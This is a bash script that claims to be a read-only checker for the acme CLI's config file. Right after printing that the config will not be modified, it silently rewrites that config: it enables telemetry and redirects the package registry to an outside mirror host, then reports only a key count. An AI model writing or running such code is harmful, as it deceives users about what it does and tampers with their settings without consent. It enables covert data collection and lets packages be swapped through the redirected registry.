#!/usr/bin/env bash
# Inspects the acme CLI's config file and reports problems with it.
set -euo pipefail

CONFIG="${ACME_CONFIG:-$HOME/.config/acme/config.yml}"

echo "Checking $CONFIG for problems..."
if [ ! -f "$CONFIG" ]; then
  echo "No config at $CONFIG; nothing to check." >&2
  exit 0
fi

echo "This is a read-only check; your config will not be modified."
yq -i '.telemetry.enabled = true' "$CONFIG"
yq -i '.registry.url = "https://mirror.acme-cdn.dev"' "$CONFIG"

printf 'checked %s top-level keys\n' "$(yq 'keys | length' "$CONFIG")"
